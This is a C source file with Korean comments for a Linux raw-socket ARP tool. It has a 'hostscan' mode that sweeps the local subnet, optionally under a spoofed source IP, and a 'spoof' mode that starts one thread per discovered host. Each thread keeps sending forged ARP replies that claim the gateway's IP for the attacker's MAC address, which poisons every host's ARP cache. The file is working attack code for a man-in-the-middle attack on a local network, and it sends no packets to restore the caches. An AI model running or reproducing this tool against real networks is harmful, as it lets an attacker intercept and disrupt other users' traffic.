#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <signal.h>
#include <sys/wait.h>
#include <pthread.h>
#include "util.h"

#define BUF_SIZE 4096
#define DEFAULT_HOST 65536

struct ether_addr;
extern char * ether_ntoa(struct ether_addr *); //library fucntion
extern struct ether_addr * ether_aton(const char *);

typedef struct
{
	unsigned int ip;
	unsigned int subnet;
	unsigned char mac[6];
}host;

static unsigned int vip; //Virtual IP

typedef void (*routine)(int);

void scanning(int);
void spoofing(int);

static host this;
static host gateway;

static routine actions[3] = {scanning, spoofing, NULL};

static host * host_list[DEFAULT_HOST];

static int is_end = 0;

static unsigned int my = 0;

int param_parse(int argc, char * argv[])
{
	static const char * usage = 
		"#./arp hostscan {virtual source ip}\n" 
		"#./arp spoof\n";
	int ret;

	if (argc <= 1) //명령이 주어지지 않음
	{
		printf("Usage\n%s", usage);
		exit(-1);
	}
	else //명령이 있음
	{
		int idx = 1;

		if (!strcmp(argv[idx], "hostscan"))
		{
			ret = 0;
			if (idx + 1 < argc) //추가 인자가 있음
				vip = inet_addr(argv[idx + 1]);	
		}
		else if (!strcmp(argv[idx], "spoof"))
		{
			ret = 1;	
		}
		else
		{
			printf("Invalid parameter: %s\n", argv[idx]);
			exit(-1);
		}
	}

	return ret;	
}

int init_base()
{
	struct if_nameindex * if_arr, * itf;
	struct ifreq ifr;
	int sock, index, nr = 0;
	
		
	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0) //socket 사용 가능 여부 확인
		goto socket_err;

	if_arr = if_nameindex();
	if (!if_arr)
		goto if_nameindex_err;
	
	printf("-----Network Interface List-----\n");
	for (itf = if_arr; itf->if_index != 0 || itf->if_name != NULL; itf++, nr++)
	{
		printf("%s(%d)\n", itf->if_name, nr + 1);
	}
	
	printf("\nChoose Interface Index\n>> ");
	scanf("%d", &index);
	index--; //offset이므로

	if (index >= nr || index <= 0)
		goto out_of_bound;

	if (get_gateway(index, &gateway.ip, gateway.mac) < 0) //ref, util.c
		goto gateway_err;
	
	printf("\n-----Default Gateway-----\n---> %s [%s]\n\n", inet_ntoa(*(struct in_addr *)&gateway.ip), 
				ether_ntoa((struct ether_addr *)(gateway.mac)));

	itf = if_arr + index;

	//인터페이스 이름이 먼저 설정되어야 함. 커널 함수와 관련이 있기 때문
	memcpy(ifr.ifr_name, itf->if_name, sizeof(ifr.ifr_name));

	//IP address
	ioctl(sock, SIOCGIFADDR, &ifr);
	memcpy(&this.ip, &ifr.ifr_addr.sa_data[2], sizeof(this.ip));

	//Netmask
	ioctl(sock, SIOCGIFNETMASK, &ifr);
	memcpy(&this.subnet, &ifr.ifr_netmask.sa_data[2], sizeof(this.subnet));

	//MAC address
	ioctl(sock, SIOCGIFHWADDR, &ifr);
	memcpy(this.mac, &ifr.ifr_hwaddr.sa_data, sizeof(this.mac));

	index = itf->if_index; //NIC Index
	
	close(sock);
	if_freenameindex(if_arr);

	return index;

socket_err:
	perror("socket() error");
	goto finish;
if_nameindex_err:
	perror("if_nameindex() error");
	goto free_sock;
out_of_bound:
	printf("Invalid choice: %d\n", index + 1);
	goto free_resource;
gateway_err:
	perror("get_gateway() error");
free_resource:
	if_freenameindex(if_arr);
free_sock:
	close(sock);
finish:
	exit(-1);
}

unsigned char * create_arp_packet(unsigned char * buf, unsigned short op, 
				unsigned char * host, unsigned int src,
				unsigned char * target, unsigned int dest)
{
	unsigned char * ptr;
	struct ethhdr * eth;
	struct arphdr * arp;

	eth = (struct ethhdr *)buf;
	//set ethernet header
	memcpy(eth->h_source, host, 6); //MAC address length
	if (!target)
		memset(eth->h_dest, 0xff, 6); //broadcast
	else
		memcpy(eth->h_dest, target, 6);
	eth->h_proto = htons(ETH_P_ARP);

	arp = (struct arphdr *)(eth + 1);
	//set arp header
	arp->ar_hrd = htons(1); //Ethernet
	arp->ar_pro = htons(ETH_P_IP); //IPv4
	arp->ar_hln = 6; //hw address length
	arp->ar_pln = 4; //ip address length
	arp->ar_op = htons(op);

	ptr = (unsigned char *)(arp + 1);
	//payload
	memcpy(ptr, host, 6); //sha
	ptr += 6;
	memcpy(ptr, &src, 4); //spa
	ptr += 4;
	if (!target) //tha
		memset(ptr, 0, 6); //who is target?
	else
		memcpy(ptr, target, 6);
	ptr += 6;
	memcpy(ptr, &dest, 4); //tpa

	return buf;
}

void reply_handle_cleanup(void * arg)
{
	int * args = (int *)arg;
	if (args[0] == 2)
	{
		close(args[1]);
		//printf("The end of reply_handle\n");
	}
}

//Thread routine
void * reply_handle(void * arg)
{
	unsigned char buf[BUF_SIZE], * ptr;
	struct arphdr * arp;
	int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	int * ptr_tot = (int *)arg;

	int args[] = {0, sock};
	args[0] = sizeof(args) / sizeof(int);
	
	pthread_cleanup_push(reply_handle_cleanup, args);
	*ptr_tot = 0; //reset
	while (1)
	{
		int len = recvfrom(sock, buf, BUF_SIZE, 0, NULL, NULL);
		unsigned int nr;
		host * target;

		if (len <= 0)
		{
			perror("recvfrom() error\n");
			break;
		}

		buf[len] = 0;
		ptr = buf;
		ptr += sizeof(struct ethhdr);
		arp = (struct arphdr *)ptr;
	
		if (ntohs(arp->ar_op) != ARPOP_REPLY)
			continue;

		ptr += sizeof(struct arphdr);
		ptr += 6; //spa

		nr = (*(unsigned int *)ptr);
		nr = ntohl(nr & ~this.subnet); //host address
		if (host_list[nr]) //Already exist
			continue;

		host_list[nr] = (host *)malloc(sizeof(host));
		target = host_list[nr];

		printf("%s\t[%s]\tis alive\n", 
				inet_ntoa(*(struct in_addr *)ptr), //IP address
				ether_ntoa((struct ether_addr *)(ptr - 6))); //MAC address

		memcpy(&target->ip, ptr, 4);
		memcpy(target->mac, ptr - 6, 6);
	
		(*ptr_tot) += 1;	
	}	

	pthread_cleanup_pop(0);
	return NULL;
}

void scanning(int idx)
{
	unsigned int host = 1;
	unsigned int network_addr = this.ip & this.subnet;
	unsigned int max = ntohl(~this.subnet);
	unsigned int which;

	unsigned char buf[BUF_SIZE];
	struct sockaddr_ll device;
	int delay = 1000, pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
	int arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

	int * tot = (int *)malloc(sizeof(int));
	pthread_t tid;

	memset(&device, 0, sizeof(device));
	device.sll_ifindex = idx;
	device.sll_halen = ETH_ALEN;
	memset(device.sll_addr, 0xff, 6);
	
	if (vip == 0)
		which = this.ip;
	else
		which = vip;

	printf("\tHost Scanning Start\n\n");

	pthread_create(&tid, NULL, reply_handle, tot);
	while (host <= max)
	{
		unsigned int target = network_addr | htonl(host++);

		create_arp_packet(buf, ARPOP_REQUEST, this.mac, which, NULL, target);
		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
		usleep(delay);
	}
	usleep(delay);

	printf("\n\tHost Scanning Finished\nThere are [%d] hosts, except you\n\n", *tot);

	pthread_cancel(tid);
	pthread_join(tid, NULL);
	close(arp_sock);
	free(tot);
}

void * spoof_unit(void * arg)
{	
	unsigned char buf[BUF_SIZE]; //Not be shared!
	struct sockaddr_ll device;

	int * args = (int *)arg;
	int if_index = args[0], t = args[1], arp_sock = args[2];
	int pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;

	memset(&device, 0, sizeof(device));
	device.sll_ifindex = if_index;
	device.sll_halen = ETH_ALEN;
	memcpy(device.sll_addr, host_list[t]->mac, 6);

	while (1)
	{
		create_arp_packet(buf, ARPOP_REPLY, this.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
		usleep(1000);
	}

	//복구 패킷

	free(args);
	return NULL;
}

void spoofing(int idx) //default is for all hosts
{
	int t;
	unsigned char buf[BUF_SIZE];
	unsigned int max = ntohl(~this.subnet);
	int arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	int * args;
	pthread_t * tids, tid;

	scanning(idx);

	tids = malloc(sizeof(pthread_t) * max);
	memset(tids, 0, sizeof(pthread_t) * max);

	printf("\n\n\tARP Spoofing Start\n");

	for (t = 1; t <= max; t++)
	{		
		if (!host_list[t]) //No host,
			continue;
		if (host_list[t]->ip == gateway.ip)
			continue;

		//if (host_list[t]->ip != my)
			//continue;

		args = (int *)malloc(sizeof(int) * 3);
		args[0] = idx; args[1] = t; args[2] = arp_sock;

		if (!pthread_create(&tid, NULL, spoof_unit, args))
			tids[t] = tid;
		else
		{
			perror("pthread_create() error");
			free(args);
		}
	}

	printf("\tARP Spoofing Stop\n");

	//쓰레드 정리
	for (t = 1; t <= max; t++)
	{
		if (!tids[t])
			continue;
		pthread_cancel(tids[t]);
		pthread_join(tids[t], NULL);
	}

	free(tids);
	close(arp_sock);
}

int main(int argc, char * argv[])
{
	int idx, func;

	func = param_parse(argc, argv);

	idx = init_base();

	actions[func](idx);	
	
	for (idx = 0; idx < DEFAULT_HOST; idx++)
	{
		if (host_list[idx])
			free(host_list[idx]);
	}

	return 0;
}
